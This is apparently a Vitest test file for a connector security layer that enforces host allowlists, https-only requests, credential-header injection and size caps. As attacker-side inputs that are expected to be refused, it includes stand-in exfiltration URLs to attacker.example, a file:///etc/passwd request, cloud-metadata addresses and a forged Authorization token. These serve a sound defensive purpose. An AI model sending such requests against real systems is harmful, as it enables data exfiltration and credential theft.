import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import {
  checkConnectorRequestUrl,
  createLiveHost,
  hostMatchesAllowEntry,
  type ConnectorBlobSink,
  type LiveHostConnector,
} from './live-host';

/**
 * The live host is the security half of the connector layer, so these tests
 * are written from the attacker's side: what a connector body would have to do
 * to reach something it must not, and the refusal it gets instead.
 *
 * No test performs real IO — the global `fetch` is stubbed, so an assertion
 * that the stub was never called is a proof that nothing left the process.
 */

const GITHUB: LiveHostConnector = {
  name: 'github',
  endpointMode: 'fixed',
  allowedHosts: ['api.github.com'],
};

const CONFLUENCE: LiveHostConnector = {
  name: 'confluence',
  endpointMode: 'per-credential',
  allowedHosts: ['atlassian.net'],
};

/** A connector that (wrongly) allowlists infrastructure addresses: proves the
 * private/metadata guard is a second, independent gate rather than something
 * an allowlist entry can wave through. */
const SELF_HOSTED: LiveHostConnector = {
  name: 'self-hosted',
  endpointMode: 'fixed',
  allowedHosts: ['10.0.0.5', '169.254.169.254', 'metadata.google.internal'],
};

const NATIVE_ONLY: LiveHostConnector = {
  name: 'webdav',
  endpointMode: 'fixed',
  allowedHosts: [],
};

function jsonResponse(
  data: unknown,
  init: { status?: number; headers?: Record<string, string> } = {},
): Response {
  return new Response(JSON.stringify(data), {
    status: init.status ?? 200,
    headers: { 'content-type': 'application/json', ...init.headers },
  });
}

let fetchStub: ReturnType<typeof vi.fn>;

function lastRequest(): { url: string; init: RequestInit } {
  const call = fetchStub.mock.calls.at(-1);
  if (!call) throw new Error('fetch was never called');
  return { url: String(call[0]), init: call[1] ?? {} };
}

function headersOf(init: RequestInit): Record<string, string> {
  const raw = init.headers;
  if (!raw) return {};
  if (raw instanceof Headers) return Object.fromEntries(raw.entries());
  if (Array.isArray(raw)) return Object.fromEntries(raw);
  return { ...raw };
}

beforeEach(() => {
  // The self-hosted opt-in must not be inherited from the developer's shell:
  // these tests assert the default, fail-closed posture.
  vi.stubEnv('TALE_ALLOW_PRIVATE_PROVIDER_HOSTS', '');
  fetchStub = vi.fn(async () => jsonResponse({ ok: true }));
  vi.stubGlobal('fetch', fetchStub);
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

describe('host allowlist', () => {
  it('admits exactly the declared host for a fixed-endpoint connector', () => {
    expect(
      checkConnectorRequestUrl('https://api.github.com/user/repos', GITHUB)
        .hostname,
    ).toBe('api.github.com');
  });

  it('refuses a subdomain of a fixed-endpoint connector host', () => {
    expect(() =>
      checkConnectorRequestUrl('https://evil.api.github.com/user', GITHUB),
    ).toThrow(/not allowed for connector "github"/);
  });

  it('refuses an unrelated host', () => {
    expect(() =>
      checkConnectorRequestUrl('https://attacker.example/steal', GITHUB),
    ).toThrow(/not allowed/);
  });

  it('admits a real subdomain for a per-credential connector', () => {
    expect(
      checkConnectorRequestUrl(
        'https://acme.atlassian.net/wiki/rest/api/content',
        CONFLUENCE,
      ).hostname,
    ).toBe('acme.atlassian.net');
    // The bare allowlisted host is itself admissible.
    expect(
      checkConnectorRequestUrl('https://atlassian.net/wiki', CONFLUENCE)
        .hostname,
    ).toBe('atlassian.net');
  });

  it('refuses a look-alike host that merely ENDS with the allowed one', () => {
    // The whole point of matching on a dot boundary: anyone can register
    // evil-atlassian.net.
    expect(() =>
      checkConnectorRequestUrl('https://evil-atlassian.net/wiki', CONFLUENCE),
    ).toThrow(/not allowed for connector "confluence"/);
    expect(
      hostMatchesAllowEntry(
        'evil-atlassian.net',
        'atlassian.net',
        'per-credential',
      ),
    ).toBe(false);
  });

  it('refuses a host that merely CONTAINS the allowed one', () => {
    expect(() =>
      checkConnectorRequestUrl(
        'https://atlassian.net.attacker.example/wiki',
        CONFLUENCE,
      ),
    ).toThrow(/not allowed/);
  });

  it('normalizes case and a trailing dot before matching', () => {
    expect(
      checkConnectorRequestUrl('https://API.GitHub.com./user', GITHUB).hostname,
    ).toBe('api.github.com.');
  });

  it('refuses plaintext http even for an allowed host', () => {
    expect(() =>
      checkConnectorRequestUrl('http://api.github.com/user', GITHUB),
    ).toThrow(/https only/);
  });

  it('refuses a non-http scheme', () => {
    expect(() =>
      checkConnectorRequestUrl('file:///etc/passwd', GITHUB),
    ).toThrow(/https only/);
  });

  it('refuses an unparseable URL', () => {
    expect(() => checkConnectorRequestUrl('not a url', GITHUB)).toThrow(
      /not a valid URL/,
    );
  });

  it('refuses private and cloud-metadata addresses even when allowlisted', () => {
    for (const url of [
      'https://10.0.0.5/admin',
      'https://169.254.169.254/latest/meta-data/',
      'https://metadata.google.internal/computeMetadata/v1/',
    ]) {
      expect(() => checkConnectorRequestUrl(url, SELF_HOSTED)).toThrow(
        /not reachable from a connector/,
      );
    }
  });

  it('refuses every request for a connector that declares no hosts', () => {
    expect(() =>
      checkConnectorRequestUrl('https://example.com/', NATIVE_ONLY),
    ).toThrow(/declares no allowedHosts/);
  });
});

describe('credential injection', () => {
  it('applies the resolved Authorization header', async () => {
    const host = createLiveHost({
      connector: GITHUB,
      authHeader: 'Bearer ghp_secret',
      action: 'list_repos',
    });
    await host.http.get('https://api.github.com/user/repos', {
      headers: { Accept: 'application/vnd.github+json' },
    });
    const headers = headersOf(lastRequest().init);
    expect(headers.Authorization).toBe('Bearer ghp_secret');
    expect(headers.Accept).toBe('application/vnd.github+json');
  });

  it('does not let a body override the injected Authorization', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const host = createLiveHost({
      connector: GITHUB,
      authHeader: 'Bearer ghp_secret',
      action: 'list_repos',
    });
    await host.http.get('https://api.github.com/user/repos', {
      headers: { authorization: 'Bearer attacker-token', 'X-Keep': 'yes' },
    });
    const headers = headersOf(lastRequest().init);
    expect(headers.Authorization).toBe('Bearer ghp_secret');
    expect(headers.authorization).toBeUndefined();
    expect(headers['X-Keep']).toBe('yes');
    expect(warn).toHaveBeenCalledWith(
      expect.stringContaining('set its own Authorization header'),
    );
  });

  it('sends no Authorization for an api-key connector', async () => {
    const host = createLiveHost({ connector: GITHUB });
    await host.http.get('https://api.github.com/user/repos');
    const headers = headersOf(lastRequest().init);
    expect(headers.Authorization).toBeUndefined();
    expect(headers.authorization).toBeUndefined();
  });

  it('checks a per-credential endpoint against the allowlist up front', () => {
    expect(() =>
      createLiveHost({
        connector: CONFLUENCE,
        endpoint: 'https://evil-atlassian.net',
      }),
    ).toThrow(/not allowed for connector "confluence"/);
    expect(fetchStub).not.toHaveBeenCalled();
  });

  it('normalizes an accepted endpoint to its origin', () => {
    const host = createLiveHost({
      connector: CONFLUENCE,
      endpoint: 'https://acme.atlassian.net/wiki/',
    });
    expect(host.endpoint).toBe('https://acme.atlassian.net');
  });
});

describe('responses', () => {
  it('hands a non-2xx response to the body instead of throwing', async () => {
    fetchStub.mockResolvedValueOnce(
      jsonResponse({ message: 'Not Found' }, { status: 404 }),
    );
    const host = createLiveHost({ connector: GITHUB });
    const response = await host.http.get('https://api.github.com/user/repos');
    expect(response.status).toBe(404);
    expect(response.headers['content-type']).toContain('application/json');
    expect(response.json()).toEqual({ message: 'Not Found' });
    expect(response.text()).toContain('Not Found');
  });

  it('hands a 500 to the body too', async () => {
    fetchStub.mockResolvedValueOnce(new Response('boom', { status: 500 }));
    const host = createLiveHost({ connector: GITHUB });
    const response = await host.http.post('https://api.github.com/graphql', {
      body: '{}',
    });
    expect(response.status).toBe(500);
    expect(response.text()).toBe('boom');
  });

  it('explains a body that is not JSON rather than returning undefined', async () => {
    fetchStub.mockResolvedValueOnce(
      new Response('<html>nope</html>', {
        status: 200,
        headers: { 'content-type': 'text/html' },
      }),
    );
    const host = createLiveHost({ connector: GITHUB });
    const response = await host.http.get('https://api.github.com/user');
    expect(() => response.json()).toThrow(/not JSON/);
  });

  it('sends every verb the contract declares', async () => {
    const host = createLiveHost({ connector: GITHUB });
    const url = 'https://api.github.com/repos/tale/tale/issues/1';
    await host.http.get(url);
    await host.http.post(url, { body: '{}' });
    await host.http.put(url, { body: '{}' });
    await host.http.patch(url, { body: '{}' });
    await host.http.delete(url);
    expect(fetchStub.mock.calls.map((c) => String(c[1]?.method))).toEqual([
      'GET',
      'POST',
      'PUT',
      'PATCH',
      'DELETE',
    ]);
  });

  it('caps the response size', async () => {
    fetchStub.mockResolvedValueOnce(new Response('x'.repeat(4096)));
    const host = createLiveHost({ connector: GITHUB, maxResponseBytes: 512 });
    await expect(host.http.get('https://api.github.com/user')).rejects.toThrow(
      /exceed|limit/i,
    );
  });

  it('returns base64 for an attachment download', async () => {
    fetchStub.mockResolvedValueOnce(
      new Response('binary-bytes', {
        status: 200,
        headers: { 'content-type': 'application/octet-stream' },
      }),
    );
    const host = createLiveHost({ connector: GITHUB });
    const response = await host.http.get('https://api.github.com/blob', {
      responseType: 'base64',
    });
    expect(response.text()).toBe(
      Buffer.from('binary-bytes').toString('base64'),
    );
  });

  it('refuses a disallowed host without issuing a request', async () => {
    const host = createLiveHost({ connector: GITHUB });
    await expect(
      host.http.post('https://attacker.example/collect', { body: 'secrets' }),
    ).rejects.toThrow(/not allowed/);
    expect(fetchStub).not.toHaveBeenCalled();
  });

  it('surfaces a transport failure as a coded error, never as a response', async () => {
    fetchStub.mockRejectedValueOnce(new Error('ECONNRESET'));
    const host = createLiveHost({ connector: GITHUB });
    await expect(host.http.get('https://api.github.com/user')).rejects.toThrow(
      /failed/,
    );
  });
});

describe('files', () => {
  const sink = (): ConnectorBlobSink & {
    calls: Array<{ fileName: string; encoding: string; data: string }>;
  } => {
    const calls: Array<{ fileName: string; encoding: string; data: string }> =
      [];
    return {
      calls,
      store: async (args) => {
        calls.push({
          fileName: args.fileName,
          encoding: args.encoding,
          data: args.data,
        });
        return {
          id: `blob-${calls.length}`,
          fileName: args.fileName,
          contentType: args.contentType,
          size: args.data.length,
        };
      },
    };
  };

  it('omits ctx.files when no blob sink is supplied', () => {
    expect(createLiveHost({ connector: GITHUB }).files).toBeUndefined();
  });

  it('stores bytes through the supplied sink', async () => {
    const blobs = sink();
    const host = createLiveHost({ connector: GITHUB, blobs });
    const stored = await host.files?.store('hello', {
      encoding: 'utf-8',
      contentType: 'text/plain',
      fileName: 'note.txt',
    });
    expect(stored).toMatchObject({ id: 'blob-1', fileName: 'note.txt' });
    expect(blobs.calls[0]).toMatchObject({
      fileName: 'note.txt',
      encoding: 'utf-8',
    });
  });

  it('downloads through the same policy as any other request', async () => {
    const blobs = sink();
    const host = createLiveHost({
      connector: GITHUB,
      authHeader: 'Bearer ghp_secret',
      blobs,
    });
    await expect(
      host.files?.download('https://attacker.example/x', {
        fileName: 'payload.bin',
      }),
    ).rejects.toThrow(/not allowed/);
    expect(fetchStub).not.toHaveBeenCalled();

    fetchStub.mockResolvedValueOnce(
      new Response('file-bytes', {
        status: 200,
        headers: { 'content-type': 'application/pdf' },
      }),
    );
    const stored = await host.files?.download(
      'https://api.github.com/assets/1',
      { fileName: 'report.pdf' },
    );
    expect(stored).toMatchObject({
      fileName: 'report.pdf',
      contentType: 'application/pdf',
    });
    expect(blobs.calls.at(-1)).toMatchObject({
      encoding: 'base64',
      data: Buffer.from('file-bytes').toString('base64'),
    });
    expect(headersOf(lastRequest().init).Authorization).toBe(
      'Bearer ghp_secret',
    );
  });

  it('reports a failed download instead of storing an error page', async () => {
    const blobs = sink();
    const host = createLiveHost({ connector: GITHUB, blobs });
    fetchStub.mockResolvedValueOnce(new Response('nope', { status: 403 }));
    await expect(
      host.files?.download('https://api.github.com/assets/1', {
        fileName: 'report.pdf',
      }),
    ).rejects.toThrow(/failed \(403\)/);
    expect(blobs.calls).toHaveLength(0);
  });
});

describe('base64 helpers', () => {
  it('round-trips utf-8 text', () => {
    const host = createLiveHost({ connector: GITHUB });
    const encoded = host.base64Encode('héllo wörld');
    expect(encoded).toBe(Buffer.from('héllo wörld', 'utf8').toString('base64'));
    expect(host.base64Decode(encoded)).toBe('héllo wörld');
  });
});
